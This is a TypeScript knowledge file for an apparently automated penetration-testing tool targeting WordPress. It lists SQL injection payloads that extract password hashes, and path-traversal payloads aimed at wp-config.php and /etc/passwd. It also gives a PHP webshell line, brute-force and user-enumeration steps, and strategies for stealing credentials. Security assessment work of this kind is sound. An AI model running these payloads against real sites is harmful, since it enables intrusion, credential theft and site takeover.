/**
 * WordPress Knowledge
 */
import type { TechKnowledge } from '../types';

export const WORDPRESS_KNOWLEDGE: TechKnowledge = {
  id: 'wordpress',
  name: 'WordPress',
  category: 'cms',

  fingerprints: {
    headers: {
      'x-powered-by': /PHP/,
      'link': /wp-json/,
    },
    cookies: ['wordpress_logged_in', 'wordpress_test_cookie', 'wp-settings'],
    bodyPatterns: [
      /wp-content/,
      /wp-includes/,
      /wp-json/,
      /<meta name="generator" content="WordPress/,
      /xmlrpc\.php/,
    ],
    urlPatterns: [
      /\/wp-admin\//,
      /\/wp-content\//,
      /\/wp-includes\//,
      /\/wp-login\.php/,
      /\/wp-json\//,
    ],
    errorPatterns: [
      /WordPress database error/,
      /Fatal error.*wp-content/,
      /Call to undefined function.*wp_/,
    ],
  },

  auth: {
    type: 'session',
    cookieName: 'wordpress_logged_in_*',
    loginEndpoint: '/wp-login.php',
    logoutEndpoint: '/wp-login.php?action=logout',
    commonMisconfigs: [
      'XML-RPC enabled (brute force, pingback attacks)',
      'User enumeration via REST API',
      'Weak admin credentials',
      'Debug mode enabled (WP_DEBUG)',
      'File editing enabled in admin',
    ],
  },

  commonEndpoints: [
    '/wp-admin/',
    '/wp-login.php',
    '/wp-content/',
    '/wp-includes/',
    '/wp-json/',
    '/wp-json/wp/v2/users',
    '/xmlrpc.php',
    '/readme.html',
    '/license.txt',
    '/wp-config.php',
    '/wp-config.php.bak',
    '/wp-content/debug.log',
    '/wp-content/uploads/',
    '/wp-content/plugins/',
    '/wp-content/themes/',
    '/?author=1',
    '/?rest_route=/wp/v2/users',
  ],

  vulns: {
    sqli: {
      techniques: [
        {
          name: 'Plugin SQL Injection',
          description: 'Many WordPress plugins have SQL injection vulnerabilities',
          how: 'Test plugin parameters with SQLi payloads',
          context: 'When vulnerable plugins are installed',
          examples: [
            '/wp-admin/admin-ajax.php?action=plugin_action&id=1 OR 1=1',
            '/?plugin_param=\' OR 1=1--',
          ],
          payloads: [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' UNION SELECT 1,2,3,4,5--",
            "1' AND SLEEP(5)--",
          ],
        },
        {
          name: 'WordPress Core SQLi',
          description: 'Historical SQL injection in WordPress core',
          how: 'Check WordPress version and lookup applicable CVEs',
          context: 'When running outdated WordPress versions',
          examples: [
            'CVE-2022-21661: WP_Query SQL injection',
          ],
          payloads: [],
        },
      ],
      payloads: [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' UNION SELECT user_login,user_pass FROM wp_users--",
        "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
      ],
      indicators: {
        vulnerable: [
          'WordPress database error',
          'mysqli error',
          'SQL syntax error',
          'Unexpected data returned',
        ],
        notVulnerable: [
          'Escaped properly',
          'Parameterized query',
          'Input sanitized',
        ],
      },
      adaptiveStrategy: 'First enumerate plugins via /wp-content/plugins/. Check plugin versions against known CVEs. Test admin-ajax.php actions for SQLi.',
    },

    auth_bypass: {
      techniques: [
        {
          name: 'User Enumeration via REST API',
          description: 'Enumerate usernames via WordPress REST API',
          how: 'Query /wp-json/wp/v2/users to get usernames',
          context: 'When REST API is not restricted (default)',
          examples: [
            'GET /wp-json/wp/v2/users',
            'GET /?rest_route=/wp/v2/users',
          ],
          payloads: [],
          indicators: {
            vulnerable: [
              'User list returned',
              'Usernames exposed',
              'Slugs reveal usernames',
            ],
            notVulnerable: [
              '401 Unauthorized',
              'REST API disabled',
              'Empty list',
            ],
          },
        },
        {
          name: 'User Enumeration via Author Archives',
          description: 'Enumerate usernames via author ID parameter',
          how: 'Iterate /?author=N to find valid usernames',
          context: 'When author archives are enabled (default)',
          examples: [
            '/?author=1 -> redirects to /author/admin/',
            '/?author=2 -> redirects to /author/editor/',
          ],
          payloads: ['1', '2', '3', '4', '5'],
          indicators: {
            vulnerable: [
              'Redirect to author archive',
              'Username in URL',
            ],
            notVulnerable: [
              '404 for invalid author',
              'No redirect',
            ],
          },
        },
        {
          name: 'XML-RPC Brute Force',
          description: 'Brute force credentials via XML-RPC multicall',
          how: 'XML-RPC allows multiple authentication attempts per request',
          context: 'When xmlrpc.php is enabled (default)',
          examples: [
            'POST /xmlrpc.php with system.multicall',
          ],
          payloads: [],
          indicators: {
            vulnerable: [
              'xmlrpc.php returns 200',
              'XML-RPC server accepts requests',
              'Multicall supported',
            ],
            notVulnerable: [
              '403/404 on xmlrpc.php',
              'XML-RPC disabled',
            ],
          },
        },
        {
          name: 'wp-login.php Brute Force',
          description: 'Brute force admin credentials',
          how: 'Standard password brute force on login form',
          context: 'When rate limiting not implemented',
          examples: [
            'POST /wp-login.php with log=admin&pwd=password',
          ],
          payloads: [],
        },
      ],
      payloads: [],
      indicators: {
        vulnerable: [
          'Username enumeration successful',
          'Brute force possible',
          'Weak credentials',
        ],
        notVulnerable: [
          'Rate limiting active',
          'CAPTCHA required',
          '2FA enabled',
        ],
      },
      adaptiveStrategy: 'First enumerate users via REST API and author archives. Then check if xmlrpc.php is enabled for brute force. Use discovered usernames for targeted attacks.',
    },

    lfi: {
      techniques: [
        {
          name: 'Plugin LFI',
          description: 'Local file inclusion via vulnerable plugins',
          how: 'Many plugins have file parameter vulnerabilities',
          context: 'When vulnerable plugins are installed',
          examples: [
            '/wp-content/plugins/vulnerable/download.php?file=../../../wp-config.php',
          ],
          payloads: [
            '../../../wp-config.php',
            '....//....//....//wp-config.php',
            '../../../etc/passwd',
          ],
        },
        {
          name: 'Theme LFI',
          description: 'Local file inclusion via vulnerable themes',
          how: 'Some themes include files based on user input',
          context: 'When vulnerable themes are installed',
          examples: [
            '/wp-content/themes/theme/download.php?file=../../../wp-config.php',
          ],
          payloads: [
            '../../../wp-config.php',
            '../wp-config.php',
          ],
        },
      ],
      payloads: [
        '../../../wp-config.php',
        '....//....//....//wp-config.php',
        '..%2f..%2f..%2fwp-config.php',
        '../../../etc/passwd',
      ],
      indicators: {
        vulnerable: [
          'wp-config.php contents returned',
          'Database credentials exposed',
          '/etc/passwd contents',
        ],
        notVulnerable: [
          'File not found',
          'Access denied',
          'Input filtered',
        ],
      },
      adaptiveStrategy: 'Enumerate plugins and themes first. Check each for known LFI vulnerabilities. Target wp-config.php for database creds.',
    },

    rce: {
      techniques: [
        {
          name: 'Plugin/Theme Upload',
          description: 'Upload malicious plugin or theme for code execution',
          how: 'If admin access obtained, upload webshell as plugin',
          context: 'When file editing or plugin upload is enabled',
          examples: [
            'Upload plugin with PHP webshell',
            'Edit theme 404.php to add webshell',
          ],
          payloads: [],
        },
        {
          name: 'Theme Editor RCE',
          description: 'Edit theme files to inject code',
          how: 'Use Appearance > Theme Editor to modify PHP files',
          context: 'When DISALLOW_FILE_EDIT is false (default)',
          examples: [
            'Edit 404.php to add: <?php system($_GET["cmd"]); ?>',
          ],
          payloads: [],
        },
      ],
      payloads: [],
      indicators: {
        vulnerable: [
          'Plugin upload successful',
          'Theme edit successful',
          'Code execution achieved',
        ],
        notVulnerable: [
          'DISALLOW_FILE_EDIT true',
          'Upload blocked',
          'Insufficient permissions',
        ],
      },
      adaptiveStrategy: 'Requires admin access first. Check if file editing is enabled. If not, try plugin upload. Target 404.php or inactive themes.',
    },
  },

  notes: [
    'Check WordPress version in meta generator tag or readme.html',
    'Enumerate plugins via /wp-content/plugins/ directory listing',
    'Enumerate themes via /wp-content/themes/',
    'REST API at /wp-json/ often exposes sensitive info',
    'xmlrpc.php is common attack vector - check if enabled',
    'wp-config.php contains database credentials and keys',
    'Debug log at /wp-content/debug.log may contain sensitive info',
    'Check for backup files: wp-config.php.bak, .wp-config.php.swp',
    'WPScan is excellent for automated WordPress assessment',
  ],

  relatedTech: ['php', 'mysql', 'apache', 'nginx'],
};

/**
 * WordPress-specific enumeration data
 */
export const WORDPRESS_ENUM = {
  // Common plugin directories to check
  commonPlugins: [
    'contact-form-7',
    'woocommerce',
    'jetpack',
    'yoast-seo',
    'akismet',
    'elementor',
    'wpforms-lite',
    'classic-editor',
    'wordfence',
    'all-in-one-seo-pack',
    'google-analytics-for-wordpress',
    'wp-super-cache',
    'updraftplus',
    'redirection',
    'really-simple-ssl',
    'duplicator',
    'tinymce-advanced',
    'wordpress-importer',
    'wp-mail-smtp',
    'limit-login-attempts-reloaded',
  ],

  // XML-RPC methods for testing
  xmlrpcMethods: [
    'system.listMethods',
    'system.multicall',
    'wp.getUsersBlogs',
    'wp.getUsers',
    'pingback.ping',
  ],

  // Sensitive files to check
  sensitiveFiles: [
    '/wp-config.php',
    '/wp-config.php.bak',
    '/wp-config.php~',
    '/wp-config.php.old',
    '/wp-config.php.save',
    '/.wp-config.php.swp',
    '/wp-config.txt',
    '/wp-content/debug.log',
    '/debug.log',
    '/error_log',
    '/.htaccess',
    '/readme.html',
    '/license.txt',
    '/xmlrpc.php',
  ],
};
